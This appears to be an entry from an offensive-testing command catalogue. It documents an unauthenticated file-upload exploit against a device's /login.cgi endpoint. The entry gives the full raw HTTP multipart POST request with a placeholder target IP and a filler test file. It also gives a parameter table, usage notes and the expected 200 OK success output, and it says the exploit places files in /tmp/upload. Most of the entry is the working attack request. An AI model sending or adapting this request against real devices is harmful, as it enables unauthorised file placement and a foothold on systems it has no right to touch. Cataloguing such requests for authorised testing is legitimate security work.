---
id: cmd-upload-post-001
data: >-
  POST http://[ip]/login.cgi HTTP/1.1

  Proxy-Connection: keep-alive

  Content-Length: 5179

  Cache-Control: max-age=0

  Upgrade-Insecure-Requests: 1

  User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML,
  like Gecko) Chrome/55.0.2883.87 Safari/537.36

  Content-Type: multipart/form-data;
  boundary=----WebKitFormBoundaryRfhSBNfoYzLOvXnc

  Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

  Accept-Language: en-US,en;q=0.8

  Host: [ip]


  ------WebKitFormBoundaryRfhSBNfoYzLOvXnc

  Content-Disposition: form-data; name="file"; filename="test6.txt"

  Content-Type: text/plain


  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa


  ------WebKitFormBoundaryRfhSBNfoYzLOvXnc--
tags:
  - file-upload
type: command
output: |-
  HTTP/1.1 200 OK
  [response body indicating success]
executor: http
platforms:
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:10.951Z'
verified: false
validated: true
submitted: true
---
# unauthenticated-file-upload-post

## Command

```http
POST http://[ip]/login.cgi HTTP/1.1
Proxy-Connection: keep-alive
Content-Length: 5179
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRfhSBNfoYzLOvXnc
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Host: [ip]

------WebKitFormBoundaryRfhSBNfoYzLOvXnc
Content-Disposition: form-data; name="file"; filename="test6.txt"
Content-Type: text/plain

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

------WebKitFormBoundaryRfhSBNfoYzLOvXnc--
```

## Description

Sends a raw HTTP POST request to upload a test file without authentication to the /login.cgi endpoint, exploiting the vulnerability for file placement in /tmp/upload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| [ip] | Target device IP address | Yes |
| filename | Uploaded file name (e.g., test6.txt) | Yes |
| content | File content (e.g., repeated 'a's) | Yes |

## Examples

### Basic Usage

```http
POST http://192.168.1.1/login.cgi HTTP/1.1
... [full headers and body as above]
```

### Advanced Usage

Modify filename and content for different tests, ensuring Content-Length matches.

## Expected Output

HTTP 200 OK response with success indicators; file stored on device without errors.

## Related

- [[Related Procedure|procedures/Perform-Unauthenticated-File-Upload]]
